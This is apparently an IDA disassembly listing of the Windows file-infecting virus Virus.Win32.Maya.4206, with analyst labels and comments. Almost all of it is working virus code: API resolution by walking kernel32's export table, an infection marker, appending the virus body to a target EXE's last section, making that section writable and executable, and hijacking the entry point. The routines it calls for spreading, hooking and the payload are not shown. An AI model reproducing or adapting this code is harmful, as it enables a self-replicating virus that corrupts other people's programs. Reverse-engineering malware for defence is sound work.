CODE:00401000 ;
CODE:00401000 ; +-------------------------------------------------------------------------+
CODE:00401000 ; |      This file was generated by The Interactive Disassembler (IDA)      |
CODE:00401000 ; |           Copyright (c) 2025 Hex-Rays, <support@hex-rays.com>           |
CODE:00401000 ; |                            Freeware version                             |
CODE:00401000 ; +-------------------------------------------------------------------------+
CODE:00401000 ;
CODE:00401000 ; Input SHA256 : AB8FC6ECC5F9BF3749F0CCE6E8B6758EB89FC6ACF7D251E733456CA9554A708D
CODE:00401000 ; Input MD5    : 20C820A3C3C6B03D918D93F0A72D2E17
CODE:00401000 ; Input CRC32  : 3EA281F4
CODE:00401000 ; Compiler     : Visual C++ (guessed)
CODE:00401000
CODE:00401000 ; File Name   : C:\Users\...\Desktop\...\...\Леткин\Virus_Maya\Virus.Win32.Maya.4206
CODE:00401000 ; Format      : Portable executable for 80386 (PE)
CODE:00401000 ; Imagebase   : 400000
CODE:00401000 ; Timestamp   : 6D402D44 (Mon Jan 31 09:07:16 2028)
CODE:00401000 ; Section 1. (virtual address 00001000)
CODE:00401000 ; Virtual size                  : 00002000 (   8192.)
CODE:00401000 ; Section size in file          : 00001200 (   4608.)
CODE:00401000 ; Offset to raw data for section: 00000600
CODE:00401000 ; Flags E0000020: Text Executable Readable Writable
CODE:00401000 ; Alignment     : default
CODE:00401000
CODE:00401000                 .686p
CODE:00401000                 .mmx
CODE:00401000                 .model flat
CODE:00401000
CODE:00401000 ; ===========================================================================
CODE:00401000
CODE:00401000 ; Segment type: Pure code
CODE:00401000 ; Segment permissions: Read/Write/Execute
CODE:00401000 CODE            segment para public 'CODE' use32
CODE:00401000                 assume cs:CODE
CODE:00401000                 ;org 401000h
CODE:00401000                 assume es:nothing, ss:nothing, ds:CODE, fs:nothing, gs:nothing
CODE:00401000
CODE:00401000 ; =============== S U B R O U T I N E =======================================
CODE:00401000
CODE:00401000
CODE:00401000                 public start
CODE:00401000 start           proc near               ; DATA XREF: InfectOneFile+15C↓o
CODE:00401000                 push    ebp
CODE:00401001                 call    $+5
CODE:00401006
CODE:00401006 loc_401006:                             ; DATA XREF: start+9↓o
CODE:00401006                 pop     ebp
CODE:00401007                 mov     ebx, ebp
CODE:00401009                 sub     ebp, offset loc_401006 ; compute delta offset
CODE:0040100F
CODE:0040100F loc_40100F:                             ; DATA XREF: InfectOneFile+141↓w
CODE:0040100F                 mov     eax, 1000h
CODE:00401014                 add     eax, 6
CODE:00401017                 sub     ebx, eax
CODE:00401019                 mov     ss:ImageBase[ebp], ebx
CODE:0040101F                 mov     edx, offset aGetmodulehandl ; "GetModuleHandleA"
CODE:00401024                 add     edx, ebp
CODE:00401026                 mov     ecx, ss:dword_401BE6[ebp]
CODE:0040102C                 push    ebp
CODE:0040102D                 call    FindFuncInKernel32dll
CODE:00401032                 pop     ebp
CODE:00401033                 cmp     eax, 0FFFFFFFFh
CODE:00401036                 jz      short loc_401097
CODE:00401038                 nop
CODE:00401039                 nop
CODE:0040103A                 nop
CODE:0040103B                 nop
CODE:0040103C                 mov     ss:GetModuleHandleA_0[ebp], eax
CODE:00401042                 push    ebp
CODE:00401043                 mov     ebx, offset aKernel32Dll ; "KERNEL32.dll"
CODE:00401048                 add     ebx, ebp
CODE:0040104A                 push    ebx
CODE:0040104B                 call    eax             ; GetModuleHandleA
CODE:0040104D                 pop     ebp
CODE:0040104E                 mov     ss:kernel32_ImageBase[ebp], eax
CODE:00401054                 mov     edi, offset dword_401BE6
CODE:00401059                 add     edi, ebp
CODE:0040105B
CODE:0040105B loc_40105B:                             ; CODE XREF: start+7C↓j
CODE:0040105B                 mov     ecx, [edi]
CODE:0040105D                 cmp     ecx, 'MAYA'
CODE:00401063                 jz      short loc_40107E
CODE:00401065                 nop
CODE:00401066                 nop
CODE:00401067                 nop
CODE:00401068                 nop
CODE:00401069                 add     edi, 4
CODE:0040106C                 mov     edx, edi
CODE:0040106E                 add     edi, ecx
CODE:00401070                 push    edi
CODE:00401071                 call    FindFuncInKernel32dll_Export
CODE:00401076                 pop     edi
CODE:00401077                 mov     [edi], eax
CODE:00401079                 add     edi, 4
CODE:0040107C                 jmp     short loc_40105B
CODE:0040107E ; ---------------------------------------------------------------------------
CODE:0040107E
CODE:0040107E loc_40107E:                             ; CODE XREF: start+63↑j
CODE:0040107E                 mov     ss:counter[ebp], 0
CODE:00401088                 call    InfectCurWindows
CODE:0040108D                 call    HookFileFunctions
CODE:00401092                 call    Payload
CODE:00401097
CODE:00401097 loc_401097:                             ; CODE XREF: start+36↑j
CODE:00401097                 mov     eax, ss:AddressOfEntryPoint[ebp]
CODE:0040109D                 add     eax, ss:ImageBase[ebp]
CODE:004010A3                 pop     ebp
CODE:004010A4                 push    eax
CODE:004010A5                 retn
CODE:004010A5 start           endp ; sp-analysis failed
CODE:004010A5
CODE:004010A6
CODE:004010A6 ; =============== S U B R O U T I N E =======================================
CODE:004010A6
CODE:004010A6
CODE:004010A6 FindFuncInKernel32dll_Export proc near  ; CODE XREF: start+71↑p
CODE:004010A6                 mov     esi, ss:kernel32_ImageBase[ebp]
CODE:004010AC                 cmp     word ptr [esi], 'ZM'
CODE:004010B1                 jnz     loc_40114B
CODE:004010B7                 xor     eax, eax
CODE:004010B9                 mov     ax, [esi+3Ch]
CODE:004010BD                 add     eax, ss:kernel32_ImageBase[ebp]
CODE:004010C3                 xchg    eax, esi
CODE:004010C4                 cmp     word ptr [esi], 'EP'
CODE:004010C9                 jnz     loc_40114B
CODE:004010CF                 mov     esi, [esi+78h]  ; ExportDirectory
CODE:004010D2                 add     esi, ss:kernel32_ImageBase[ebp]
CODE:004010D8                 mov     eax, [esi+1Ch]
CODE:004010DB                 add     eax, ss:kernel32_ImageBase[ebp]
CODE:004010E1                 mov     ss:AddressOfFunctions[ebp], eax
CODE:004010E7                 mov     eax, [esi+20h]
CODE:004010EA                 add     eax, ss:kernel32_ImageBase[ebp]
CODE:004010F0                 mov     ss:AddressOfNames[ebp], eax
CODE:004010F6                 mov     eax, [esi+24h]
CODE:004010F9                 add     eax, ss:kernel32_ImageBase[ebp]
CODE:004010FF                 mov     ss:AddressOfNameOrdinals[ebp], eax
CODE:00401105                 xor     eax, eax
CODE:00401107
CODE:00401107 loc_401107:                             ; CODE XREF: FindFuncInKernel32dll_Export+83↓j
CODE:00401107                 push    ecx
CODE:00401108                 mov     esi, edx
CODE:0040110A                 mov     edi, ss:AddressOfNames[ebp]
CODE:00401110                 add     edi, eax
CODE:00401112                 mov     edi, [edi]
CODE:00401114                 add     edi, ss:kernel32_ImageBase[ebp]
CODE:0040111A                 repe cmpsb              ; memcmp(edi,esi,ecx)
CODE:0040111C                 cmp     ecx, 0
CODE:0040111F                 jz      short loc_40112B
CODE:00401121                 nop
CODE:00401122                 nop
CODE:00401123                 nop
CODE:00401124                 nop
CODE:00401125                 add     eax, 4
CODE:00401128                 pop     ecx
CODE:00401129                 jmp     short loc_401107
CODE:0040112B ; ---------------------------------------------------------------------------
CODE:0040112B
CODE:0040112B loc_40112B:                             ; CODE XREF: FindFuncInKernel32dll_Export+79↑j
CODE:0040112B                 pop     ecx
CODE:0040112C                 shr     eax, 1
CODE:0040112E                 add     eax, ss:AddressOfNameOrdinals[ebp]
CODE:00401134                 xor     ebx, ebx
CODE:00401136                 mov     bx, [eax]
CODE:00401139                 shl     ebx, 2
CODE:0040113C                 add     ebx, ss:AddressOfFunctions[ebp]
CODE:00401142                 mov     eax, [ebx]
CODE:00401144                 add     eax, ss:kernel32_ImageBase[ebp]
CODE:0040114A                 retn
CODE:0040114B ; ---------------------------------------------------------------------------
CODE:0040114B
CODE:0040114B loc_40114B:                             ; CODE XREF: FindFuncInKernel32dll_Export+B↑j
CODE:0040114B                                         ; FindFuncInKernel32dll_Export+23↑j
CODE:0040114B                 mov     eax, 0FFFFFFFFh
CODE:00401150                 retn
CODE:00401150 FindFuncInKernel32dll_Export endp
CODE:00401150
CODE:00401151
CODE:00401151 ; =============== S U B R O U T I N E =======================================
CODE:00401151
CODE:00401151
CODE:00401151 FindFuncInKernel32dll proc near         ; CODE XREF: start+2D↑p
CODE:00401151                                         ; HookFileFunctions+1D↓p
CODE:00401151                 mov     esi, ss:ImageBase[ebp]
CODE:00401157                 cmp     word ptr [esi], 'ZM'
CODE:0040115C                 jnz     loc_40120C
CODE:00401162                 xor     eax, eax
CODE:00401164                 mov     ax, [esi+3Ch]
CODE:00401168                 mov     esi, eax
CODE:0040116A                 add     esi, ss:ImageBase[ebp]
CODE:00401170                 cmp     word ptr [esi], 'EP'
CODE:00401175                 jnz     loc_40120C
CODE:0040117B                 mov     esi, [esi+80h]  ; ImportDirectory
CODE:00401181                 add     esi, ss:ImageBase[ebp]
CODE:00401187                 mov     eax, esi
CODE:00401189
CODE:00401189 loc_401189:                             ; CODE XREF: FindFuncInKernel32dll+52↓j
CODE:00401189                 mov     esi, eax
CODE:0040118B                 mov     esi, [esi+0Ch]  ; DLL Name
CODE:0040118E                 add     esi, ss:ImageBase[ebp]
CODE:00401194                 cmp     dword ptr [esi], 'NREK' ; Find Kernel32.dll
CODE:0040119A                 jz      short loc_4011A5
CODE:0040119C                 nop
CODE:0040119D                 nop
CODE:0040119E                 nop
CODE:0040119F                 nop
CODE:004011A0                 add     eax, 14h
CODE:004011A3                 jmp     short loc_401189
CODE:004011A5 ; ---------------------------------------------------------------------------
CODE:004011A5
CODE:004011A5 loc_4011A5:                             ; CODE XREF: FindFuncInKernel32dll+49↑j
CODE:004011A5                 mov     esi, eax
CODE:004011A7                 mov     eax, [esi+10h]
CODE:004011AA                 add     eax, ss:ImageBase[ebp]
CODE:004011B0                 mov     ss:ImportAddressTable[ebp], eax
CODE:004011B6                 cmp     dword ptr [esi], 0
CODE:004011B9                 jz      short loc_40120C
CODE:004011BB                 nop
CODE:004011BC                 nop
CODE:004011BD                 nop
CODE:004011BE                 nop
CODE:004011BF                 mov     esi, [esi]      ; Import name table
CODE:004011C1                 add     esi, ss:ImageBase[ebp]
CODE:004011C7                 mov     ebx, esi
CODE:004011C9                 xor     eax, eax
CODE:004011CB
CODE:004011CB loc_4011CB:                             ; CODE XREF: FindFuncInKernel32dll+AB↓j
CODE:004011CB                 cmp     dword ptr [ebx], 0
CODE:004011CE                 jz      short loc_40120C
CODE:004011D0                 nop
CODE:004011D1                 nop
CODE:004011D2                 nop
CODE:004011D3                 nop
CODE:004011D4                 cmp     byte ptr [ebx+3], 80h
CODE:004011D8                 jz      short loc_4011F8
CODE:004011DA                 nop
CODE:004011DB                 nop
CODE:004011DC                 nop
CODE:004011DD                 nop
CODE:004011DE                 mov     esi, [ebx]
CODE:004011E0                 add     esi, ss:ImageBase[ebp]
CODE:004011E6                 add     esi, 2
CODE:004011E9                 mov     edi, edx
CODE:004011EB                 push    ecx
CODE:004011EC                 repe cmpsb              ; memcmp (edi, eci, ecx)
CODE:004011EE                 cmp     ecx, 0
CODE:004011F1                 pop     ecx
CODE:004011F2                 jz      short loc_4011FE
CODE:004011F4                 nop
CODE:004011F5                 nop
CODE:004011F6                 nop
CODE:004011F7                 nop
CODE:004011F8
CODE:004011F8 loc_4011F8:                             ; CODE XREF: FindFuncInKernel32dll+87↑j
CODE:004011F8                 inc     eax
CODE:004011F9                 add     ebx, 4
CODE:004011FC                 jmp     short loc_4011CB
CODE:004011FE ; ---------------------------------------------------------------------------
CODE:004011FE
CODE:004011FE loc_4011FE:                             ; CODE XREF: FindFuncInKernel32dll+A1↑j
CODE:004011FE                 shl     eax, 2
CODE:00401201                 add     eax, ss:ImportAddressTable[ebp]
CODE:00401207                 mov     ebx, eax
CODE:00401209                 mov     eax, [eax]
CODE:0040120B                 retn
CODE:0040120C ; ---------------------------------------------------------------------------
CODE:0040120C
CODE:0040120C loc_40120C:                             ; CODE XREF: FindFuncInKernel32dll+B↑j
CODE:0040120C                                         ; FindFuncInKernel32dll+24↑j ...
CODE:0040120C                 mov     eax, 0FFFFFFFFh
CODE:00401211                 retn
CODE:00401211 FindFuncInKernel32dll endp
CODE:00401211
CODE:00401212
CODE:00401212 ; =============== S U B R O U T I N E =======================================
CODE:00401212
CODE:00401212
CODE:00401212 InfectOneFile   proc near               ; CODE XREF: InfectExeFiles+1A↓p
CODE:00401212                                         ; InfectFiveFiles+30↓p ...
CODE:00401212                 mov     ss:flag[ebp], 0
CODE:0040121C                 call    GetFileAttributesA_0
CODE:00401221                 mov     ss:file_attributes[ebp], eax
CODE:00401227                 push    edx             ; hFile
CODE:00401228                 mov     eax, FILE_ATTRIBUTE_NORMAL
CODE:0040122D                 call    SetFileAttributesA_0
CODE:00401232                 call    CreateFileA_0
CODE:00401237                 cmp     eax, 0FFFFFFFFh
CODE:0040123A                 jz      loc_401435
CODE:00401240                 mov     ss:file_handler[ebp], eax
CODE:00401246                 call    GetFileSize_0
CODE:0040124B                 cmp     eax, 0FFFFFFFFh
CODE:0040124E                 jz      loc_40142A
CODE:00401254                 cmp     ss:dword_401BA9[ebp], 0
CODE:0040125B                 jnz     loc_40142A
CODE:00401261                 xchg    eax, ecx
CODE:00401262                 mov     ss:file_size[ebp], ecx
CODE:00401268                 mov     eax, ss:file_handler[ebp]
CODE:0040126E                 mov     ecx, ss:file_size[ebp]
CODE:00401274                 add     ecx, 206Eh
CODE:0040127A                 call    CreateFileMappingA_0
CODE:0040127F                 cmp     eax, 0
CODE:00401282                 jz      loc_4013FA
CODE:00401288                 mov     ss:file_mapping[ebp], eax
CODE:0040128E                 mov     ecx, ss:file_size[ebp]
CODE:00401294                 add     ecx, 206Eh
CODE:0040129A                 call    MapViewOfFile_0
CODE:0040129F                 cmp     eax, 0
CODE:004012A2                 jz      loc_4013FA
CODE:004012A8                 mov     ss:mapped_file[ebp], eax
CODE:004012AE                 mov     esi, eax
CODE:004012B0                 cmp     word ptr [esi], 'ZM'
CODE:004012B5                 jnz     loc_4013EF
CODE:004012BB                 cmp     word ptr [esi+12h], 'MW'
CODE:004012C1                 jz      loc_4013EF
CODE:004012C7                 mov     word ptr [esi+12h], 'MW'
CODE:004012CD                 xor     eax, eax
CODE:004012CF                 mov     ax, [esi+3Ch]
CODE:004012D3                 cmp     ax, 0
CODE:004012D7                 jz      loc_4013EF
CODE:004012DD                 cmp     eax, file_size
CODE:004012E3                 jnb     loc_4013EF
CODE:004012E9                 add     eax, ss:mapped_file[ebp]
CODE:004012EF                 mov     esi, eax
CODE:004012F1                 cmp     word ptr [esi], 'EP'
CODE:004012F6                 jnz     loc_4013EF
CODE:004012FC                 mov     ss:pe_header[ebp], eax
CODE:00401302                 mov     eax, [esi+3Ch]
CODE:00401305                 mov     ss:FileAlignment[ebp], eax
CODE:0040130B                 mov     eax, ss:AddressOfEntryPoint[ebp]
CODE:00401311                 mov     ss:old_entry_point[ebp], eax
CODE:00401317                 mov     eax, [esi+28h]
CODE:0040131A                 mov     ss:AddressOfEntryPoint[ebp], eax
CODE:00401320                 xor     eax, eax
CODE:00401322                 mov     ax, [esi+6]     ; NumberOfSections
CODE:00401326                 dec     eax             ; NumberOfSections - 1
CODE:00401327                 mov     cx, 28h ; '('
CODE:0040132B                 mul     cx              ; (NumberOfSections - 1) * 28h
CODE:0040132E                 mov     ebx, [esi+74h]  ; NumberOfRvaAndSizes
CODE:00401331                 shl     ebx, 3          ; NumberOfRvaAndSizes * 8
CODE:00401334                 add     eax, ebx
CODE:00401336                 add     eax, 78h ; 'x'  ; 78h + NumberOfRvaAndSizes*8 + (NumberOfSections - 1) * 28h
CODE:00401339                 add     eax, ss:pe_header[ebp] ; take last section header
CODE:0040133F                 mov     ss:last_section[ebp], eax
CODE:00401345                 mov     edi, eax
CODE:00401347                 mov     eax, [edi+10h]  ; sizeofrawdata
CODE:0040134A                 mov     ss:sizeofrawdata[ebp], eax
CODE:00401350                 add     eax, [edi+0Ch]  ; virtual_address
CODE:00401353                 mov     dword ptr ss:(loc_40100F+1)[ebp], eax
CODE:00401359                 mov     ss:end_of_last_section[ebp], eax
CODE:0040135F                 push    edi
CODE:00401360                 mov     eax, [edi+14h]  ; pointertorawdata
CODE:00401363                 add     eax, ss:mapped_file[ebp] ; section data start
CODE:00401369                 add     eax, [edi+10h]  ; section data end
CODE:0040136C                 mov     edi, eax
CODE:0040136E                 mov     esi, offset start
CODE:00401373                 add     esi, ebp
CODE:00401375                 mov     ecx, 106Eh
CODE:0040137A                 cld
CODE:0040137B                 rep movsb               ; memcpy(edi,esi,ecx)
CODE:0040137D                 pop     edi
CODE:0040137E                 add     dword ptr [edi+10h], 106Eh ; increase sizeofrawdata
CODE:00401385                 add     ss:file_size[ebp], 106Eh ; increase file size
CODE:0040138F                 xor     edx, edx
CODE:00401391                 mov     eax, [edi+10h]
CODE:00401394                 mov     ecx, ss:FileAlignment[ebp]
CODE:0040139A                 push    ecx
CODE:0040139B                 div     ecx
CODE:0040139D                 pop     ecx
CODE:0040139E                 sub     ecx, edx
CODE:004013A0                 add     [edi+10h], ecx
CODE:004013A3                 add     ss:file_size[ebp], ecx
CODE:004013A9                 mov     eax, [edi+10h]
CODE:004013AC                 mov     [edi+8], eax    ; fix misc
CODE:004013AF                 or      dword ptr [edi+24h], 20h
CODE:004013B3                 or      dword ptr [edi+24h], 20000000h
CODE:004013BA                 or      dword ptr [edi+24h], 80000000h ; make RWX
CODE:004013C1                 mov     esi, ss:pe_header[ebp]
CODE:004013C7                 mov     eax, ss:end_of_last_section[ebp]
CODE:004013CD                 mov     [esi+28h], eax  ; fix AddressOfEntryPoint
CODE:004013D0                 mov     eax, ss:file_size[ebp]
CODE:004013D6                 mov     [esi+50h], eax  ; fix sizeofimage
CODE:004013D9                 mov     eax, ss:old_entry_point[ebp]
CODE:004013DF                 mov     ss:AddressOfEntryPoint[ebp], eax
CODE:004013E5                 mov     ss:flag[ebp], 1
CODE:004013EF
CODE:004013EF loc_4013EF:                             ; CODE XREF: InfectOneFile+A3↑j
CODE:004013EF                                         ; InfectOneFile+AF↑j ...
CODE:004013EF                 mov     eax, ss:mapped_file[ebp]
CODE:004013F5                 call    UnmapViewOfFile_0
CODE:004013FA
CODE:004013FA loc_4013FA:                             ; CODE XREF: InfectOneFile+70↑j
CODE:004013FA                                         ; InfectOneFile+90↑j
CODE:004013FA                 mov     eax, ss:file_mapping[ebp]
CODE:00401400                 call    CloseHandle_0
CODE:00401405                 mov     eax, ss:file_handler[ebp]
CODE:0040140B                 mov     ecx, ss:file_size[ebp]
CODE:00401411                 call    SetFilePointer_0
CODE:00401416                 cmp     eax, 0FFFFFFFFh
CODE:00401419                 jz      short loc_40142A
CODE:0040141B                 nop
CODE:0040141C                 nop
CODE:0040141D                 nop
CODE:0040141E                 nop
CODE:0040141F                 mov     eax, ss:file_handler[ebp]
CODE:00401425                 call    SetEndOfFile_0
CODE:0040142A
CODE:0040142A loc_40142A:                             ; CODE XREF: InfectOneFile+3C↑j
CODE:0040142A                                         ; InfectOneFile+49↑j ...
CODE:0040142A                 mov     eax, ss:file_handler[ebp]
CODE:00401430                 call    CloseHandle_0
CODE:00401435
CODE:00401435 loc_401435:                             ; CODE XREF: InfectOneFile+28↑j
CODE:00401435                 pop     edx
CODE:00401436                 mov     eax, ss:file_attributes[ebp]
CODE:0040143C                 call    SetFileAttributesA_0
CODE:00401441                 retn
CODE:00401441 InfectOneFile   endp
CODE:00401441
CODE:00401442
CODE:00401442 ; =============== S U B R O U T I N E =======================================
CODE:00401442
CODE:00401442
CODE:00401442 ; HANDLE __stdcall CreateFileA_0(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
CODE:00401442 CreateFileA_0   proc near               ; CODE XREF: InfectOneFile+20↑p
CODE:00401442
CODE:00401442 lpFileName      = dword ptr  4
CODE:00401442 dwDesiredAccess = dword ptr  8
CODE:00401442 dwShareMode     = dword ptr  0Ch
CODE:00401442 lpSecurityAttributes= dword ptr  10h
CODE:00401442 dwCreationDisposition= dword ptr  14h
CODE:00401442 dwFlagsAndAttributes= dword ptr  18h
CODE:00401442 hTemplateFile   = dword ptr  1Ch
CODE:00401442
CODE:00401442                 push    ebp
CODE:00401443                 push    0
CODE:00401445                 push    80h
CODE:0040144A                 push    3
CODE:0040144C                 push    0
CODE:0040144E                 push    1
CODE:00401450                 push    0C0000000h
CODE:00401455                 push    edx
CODE:00401456                 mov     eax, ss:CreateFileA[ebp]
CODE:0040145C                 call    eax
CODE:0040145E                 pop     ebp
CODE:0040145F                 retn
CODE:0040145F CreateFileA_0   endp
CODE:0040145F
CODE:00401460
CODE:00401460 ; =============== S U B R O U T I N E =======================================
CODE:00401460
CODE:00401460
CODE:00401460 ; BOOL __stdcall CloseHandle_0(HANDLE hObject)
CODE:00401460 CloseHandle_0   proc near               ; CODE XREF: InfectOneFile+1EE↑p
CODE:00401460                                         ; InfectOneFile+21E↑p
CODE:00401460
CODE:00401460 hObject         = dword ptr  4
CODE:00401460
CODE:00401460                 push    ebp
CODE:00401461                 push    eax
CODE:00401462                 mov     eax, ss:CloseHandle[ebp]
CODE:00401468                 call    eax
CODE:0040146A                 pop     ebp
CODE:0040146B                 retn
CODE:0040146B CloseHandle_0   endp
CODE:0040146B
CODE:0040146C
CODE:0040146C ; =============== S U B R O U T I N E =======================================
CODE:0040146C
CODE:0040146C
CODE:0040146C ; HANDLE __stdcall CreateFileMappingA_0(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName)
CODE:0040146C CreateFileMappingA_0 proc near          ; CODE XREF: InfectOneFile+68↑p
CODE:0040146C
CODE:0040146C hFile           = dword ptr  4
CODE:0040146C lpFileMappingAttributes= dword ptr  8
CODE:0040146C flProtect       = dword ptr  0Ch
CODE:0040146C dwMaximumSizeHigh= dword ptr  10h
CODE:0040146C dwMaximumSizeLow= dword ptr  14h
CODE:0040146C lpName          = dword ptr  18h
CODE:0040146C
CODE:0040146C                 push    ebp
CODE:0040146D                 push    0
CODE:0040146F                 push    ecx
CODE:00401470                 push    0
CODE:00401472                 push    4
CODE:00401474                 push    0
CODE:00401476                 push    eax
CODE:00401477                 mov     eax, ss:CreateFileMappingA[ebp]
CODE:0040147D                 call    eax
CODE:0040147F                 pop     ebp
CODE:00401480                 retn
CODE:00401480 CreateFileMappingA_0 endp
CODE:00401480
CODE:00401481
CODE:00401481 ; =============== S U B R O U T I N E =======================================
CODE:00401481
CODE:00401481
CODE:00401481 ; LPVOID __stdcall MapViewOfFile_0(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap)
CODE:00401481 MapViewOfFile_0 proc near               ; CODE XREF: InfectOneFile+88↑p
CODE:00401481
CODE:00401481 hFileMappingObject= dword ptr  4
CODE:00401481 dwDesiredAccess = dword ptr  8
CODE:00401481 dwFileOffsetHigh= dword ptr  0Ch
CODE:00401481 dwFileOffsetLow = dword ptr  10h
CODE:00401481 dwNumberOfBytesToMap= dword ptr  14h
CODE:00401481
CODE:00401481                 push    ebp
CODE:00401482                 push    ecx
CODE:00401483                 push    0
CODE:00401485                 push    0
CODE:00401487                 push    2
CODE:00401489                 push    eax
CODE:0040148A                 mov     eax, ss:MapViewOfFile[ebp]
CODE:00401490                 call    eax
CODE:00401492                 pop     ebp
CODE:00401493                 retn
CODE:00401493 MapViewOfFile_0 endp
CODE:00401493
CODE:00401494
CODE:00401494 ; =============== S U B R O U T I N E =======================================
CODE:00401494
CODE:00401494
CODE:00401494 ; BOOL __stdcall UnmapViewOfFile_0(LPCVOID lpBaseAddress)
CODE:00401494 UnmapViewOfFile_0 proc near             ; CODE XREF: InfectOneFile+1E3↑p
CODE:00401494
CODE:00401494 lpBaseAddress   = dword ptr  4
CODE:00401494
CODE:00401494                 push    ebp
CODE:00401495                 push    eax
CODE:00401496                 mov     eax, ss:UnmapViewOfFile[ebp]
CODE:0040149C                 call    eax
CODE:0040149E                 pop     ebp
CODE:0040149F                 retn
CODE:0040149F UnmapViewOfFile_0 endp
CODE:0040149F
CODE:004014A0
CODE:004014A0 ; =============== S U B R O U T I N E =======================================
CODE:004014A0
CODE:004014A0
CODE:004014A0 ; DWORD __stdcall SetFilePointer_0(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod)
CODE:004014A0 SetFilePointer_0 proc near              ; CODE XREF: InfectOneFile+1FF↑p
CODE:004014A0
CODE:004014A0 hFile           = dword ptr  4
CODE:004014A0 lDistanceToMove = dword ptr  8
CODE:004014A0 lpDistanceToMoveHigh= dword ptr  0Ch
CODE:004014A0 dwMoveMethod    = dword ptr  10h
CODE:004014A0
CODE:004014A0                 push    ebp
CODE:004014A1                 push    0
CODE:004014A3                 push    0
CODE:004014A5                 push    ecx
CODE:004014A6                 push    eax
CODE:004014A7                 mov     eax, ss:SetFilePointer[ebp]
CODE:004014AD                 call    eax
CODE:004014AF                 pop     ebp
CODE:004014B0                 retn
CODE:004014B0 SetFilePointer_0 endp
CODE:004014B0
CODE:004014B1
CODE:004014B1 ; =============== S U B R O U T I N E =======================================
CODE:004014B1
CODE:004014B1
CODE:004014B1 ; BOOL __stdcall SetEndOfFile_0(HANDLE hFile)
CODE:004014B1 SetEndOfFile_0  proc near               ; CODE XREF: InfectOneFile+213↑p
CODE:004014B1
CODE:004014B1 hFile           = dword ptr  4
CODE:004014B1
CODE:004014B1                 push    ebp
CODE:004014B2                 push    eax
CODE:004014B3                 mov     eax, ss:SetEndOfFile[ebp]
CODE:004014B9                 call    eax
CODE:004014BB                 pop     ebp
CODE:004014BC                 retn
CODE:004014BC SetEndOfFile_0  endp
CODE:004014BC
CODE:004014BD
CODE:004014BD ; =============== S U B R O U T I N E =======================================
CODE:004014BD
CODE:004014BD
CODE:004014BD ; DWORD __stdcall GetFileSize_0(HANDLE hFile, LPDWORD lpFileSizeHigh)
CODE:004014BD GetFileSize_0   proc near               ; CODE XREF: InfectOneFile+34↑p
CODE:004014BD
CODE:004014BD hFile           = dword ptr  4
CODE:004014BD lpFileSizeHigh  = dword ptr  8
CODE:004014BD
CODE:004014BD                 push    ebp
CODE:004014BE                 mov     ebx, offset dword_401BA9
CODE:004014C3                 add     ebx, ebp
CODE:004014C5                 push    ebx
CODE:004014C6                 push    eax
CODE:004014C7                 mov     eax, ss:GetFileSize[ebp]
CODE:004014CD                 call    eax
CODE:004014CF                 pop     ebp
CODE:004014D0                 retn
CODE:004014D0 GetFileSize_0   endp
CODE:004014D0
CODE:004014D1
CODE:004014D1 ; =============== S U B R O U T I N E =======================================
CODE:004014D1
CODE:004014D1
CODE:004014D1 ; DWORD __stdcall GetFileAttributesA_0(LPCSTR lpFileName)
CODE:004014D1 GetFileAttributesA_0 proc near          ; CODE XREF: InfectOneFile+A↑p
CODE:004014D1
CODE:004014D1 lpFileName      = dword ptr  4
CODE:004014D1
CODE:004014D1                 push    ebp
CODE:004014D2                 push    edx
CODE:004014D3                 push    edx
CODE:004014D4                 mov     eax, ss:GetFileAttributesA[ebp]
CODE:004014DA                 call    eax
CODE:004014DC                 pop     edx
CODE:004014DD                 pop     ebp
CODE:004014DE                 retn
CODE:004014DE GetFileAttributesA_0 endp
CODE:004014DE
CODE:004014DF
CODE:004014DF ; =============== S U B R O U T I N E =======================================
CODE:004014DF
CODE:004014DF
CODE:004014DF ; BOOL __stdcall SetFileAttributesA_0(LPCSTR lpFileName, DWORD dwFileAttributes)
CODE:004014DF SetFileAttributesA_0 proc near          ; CODE XREF: InfectOneFile+1B↑p
CODE:004014DF                                         ; InfectOneFile+22A↑p
CODE:004014DF
CODE:004014DF lpFileName      = dword ptr  4
CODE:004014DF dwFileAttributes= dword ptr  8
CODE:004014DF
CODE:004014DF                 push    ebp
CODE:004014E0                 push    eax
CODE:004014E1                 push    edx
CODE:004014E2                 mov     eax, ss:SetFileAttributesA[ebp]
CODE:004014E8                 call    eax
CODE:004014EA                 pop     ebp
CODE:004014EB                 retn
CODE:004014EB SetFileAttributesA_0 endp
CODE:004014EB
CODE:004014EC
CODE:004014EC ; =============== S U B R O U T I N E =======================================
CODE:004014EC
CODE:004014EC
CODE:004014EC ; DWORD __stdcall GetCurrentDirectoryA_0(DWORD nBufferLength, LPSTR lpBuffer)
CODE:004014EC GetCurrentDirectoryA_0 proc near        ; CODE XREF: InfectCurWindows+23↓p
CODE:004014EC
CODE:004014EC nBufferLength   = dword ptr  4
CODE:004014EC lpBuffer        = dword ptr  8
CODE:004014EC
CODE:004014EC                 push    ebp
CODE:004014ED                 push    eax
CODE:004014EE                 push    80h
CODE:004014F3                 mov     eax, ss:GetCurrentDirectoryA[ebp]
CODE:004014F9                 call    eax
CODE:004014FB                 pop     ebp
CODE:004014FC                 retn
CODE:004014FC GetCurrentDirectoryA_0 endp
CODE:004014FC
CODE:004014FD
CODE:004014FD ; =============== S U B R O U T I N E =======================================
CODE:004014FD
CODE:004014FD
CODE:004014FD ; BOOL __stdcall SetCurrentDirectoryA_0(LPCSTR lpPathName)
CODE:004014FD SetCurrentDirectoryA_0 proc near        ; CODE XREF: InfectCurWindows+4D↓p
CODE:004014FD                                         ; InfectCurWindows+67↓p
CODE:004014FD
CODE:004014FD lpPathName      = dword ptr  4
CODE:004014FD
CODE:004014FD                 push    ebp
CODE:004014FE                 push    eax
CODE:004014FF                 mov     eax, ss:SetCurrentDirectoryA[ebp]
CODE:00401505                 call    eax
CODE:00401507                 pop     ebp
CODE:00401508                 retn
CODE:00401508 SetCurrentDirectoryA_0 endp
CODE:00401508
CODE:00401509
